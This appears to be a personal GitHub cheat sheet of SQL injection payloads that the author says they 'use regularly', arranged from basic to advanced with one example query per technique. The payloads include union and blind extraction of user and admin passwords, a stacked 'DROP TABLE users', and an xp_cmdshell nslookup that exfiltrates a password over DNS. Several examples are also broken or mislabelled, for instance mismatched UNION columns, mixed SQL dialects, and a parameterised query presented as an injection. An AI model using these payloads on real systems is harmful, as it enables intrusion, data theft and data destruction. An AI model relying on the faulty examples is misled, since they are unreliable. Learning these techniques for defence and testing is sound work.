# SQL-injections
List of injections I use regularly

### **1. Basic SQL Injection**

**1.1 Error-Based SQL Injection:**
- **Description:** Exploits database error messages to gain information.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1' OR 1=1; --
  ```

**1.2 Union-Based SQL Injection:**
- **Description:** Uses the `UNION` operator to combine results from multiple queries.
- **Example:**
  ```sql
  SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM admin;
  ```

**1.3 Boolean-Based SQL Injection:**
- **Description:** Injects boolean conditions to test responses from the database.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1 AND 1=1; -- (True)
  SELECT * FROM users WHERE id = 1 AND 1=2; -- (False)
  ```

**1.4 Time-Based SQL Injection:**
- **Description:** Uses time delays to infer information from the database.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1 AND SLEEP(5); -- Delays response if true
  ```

### **2. Advanced SQL Injection Techniques**

**2.1 Boolean-Based Blind SQL Injection:**
- **Description:** Uses boolean conditions to determine the presence of data indirectly.
- **Example:**
  ```sql
  SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a') THEN 1 ELSE 0 END;
  ```

**2.2 Error-Based Blind SQL Injection:**
- **Description:** Leverages detailed error messages to extract information.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1' AND 1=CONVERT(int, (SELECT @@version))--;
  ```

**2.3 Time-Based Blind SQL Injection:**
- **Description:** Combines delays with conditional checks to infer data from the database.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0)--;
  ```

**2.4 Boolean-Based Time-Based SQL Injection:**
- **Description:** Combines boolean conditions and time-based delays to extract data.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1' AND IF((SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'), SLEEP(5), 0)--;
  ```

**2.5 SQL Injection with Multiple Statements (Stacked Queries):**
- **Description:** Executes multiple SQL queries in a single request.
- **Example:**
  ```sql
  SELECT * FROM users; DROP TABLE users; --;
  ```

**2.6 Second-Order SQL Injection:**
- **Description:** Occurs when injected data is stored and later used in queries.
- **Example:**
  ```sql
  -- First stage
  INSERT INTO comments (comment) VALUES ('a'); -- Injects 'a'
  -- Second stage
  SELECT * FROM users WHERE id = (SELECT comment FROM comments WHERE id = 1);
  ```

**2.7 SQL Injection with Dynamic SQL:**
- **Description:** Exploits dynamically constructed SQL queries.
- **Example:**
  ```sql
  EXEC sp_executesql N'SELECT * FROM users WHERE id = @id', N'@id INT', @id = 1; -- Dynamic execution
  ```

**2.8 SQL Injection via XML Injection:**
- **Description:** Uses XML data to perform SQL injection.
- **Example:**
  ```xml
  <user>
    <id>1</id>
    <password>' OR '1'='1</password>
  </user>
  ```

**2.9 SQL Injection via LDAP Injection:**
- **Description:** Injects SQL-like commands into LDAP queries.
- **Example:**
  ```sql
  uid=admin' OR '1'='1
  ```

**2.10 Blind SQL Injection with Out-of-Band (OOB) Channels:**
- **Description:** Uses external channels to exfiltrate data, such as DNS or HTTP requests.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1; EXEC xp_cmdshell('nslookup ' + (SELECT password FROM users LIMIT 1));
  ```

**2.11 Exploiting Error Messages for Data Extraction:**
- **Description:** Uses detailed error messages to infer database structure or data.
- **Example:**
  ```sql
  SELECT * FROM users WHERE id = 1' AND (SELECT COUNT(*) FROM information_schema.tables) > 5; -- Retrieves table count
  ```

**2.12 Union-Based SQL Injection for Schema Enumeration:**
- **Description:** Uses `UNION` to extract information about database schema, such as table and column names.
- **Example:**
  ```sql
  SELECT table_name FROM information_schema.tables UNION SELECT 1,2,3; -- Retrieves table names
  ```

**2.13 SQL Injection to Modify System Configurations:**
- **Description:** Alters database or system configurations to achieve additional privileges or impact.
- **Example:**
  ```sql
  SET GLOBAL sql_mode = ''; -- Changes SQL mode
  ```

### **Summary**

This compilation provides a comprehensive view of SQL injection types, organized from basic to advanced techniques. Basic types include error-based, union-based, boolean-based, and time-based injections. Advanced techniques encompass various blind injections, dynamic SQL, second-order injections, and complex methods involving XML, LDAP, and out-of-band channels. Understanding these techniques is crucial for both detecting and defending against SQL injection vulnerabilities effectively. Always use secure coding practices such as parameterized queries and prepared statements to mitigate SQL injection risks.
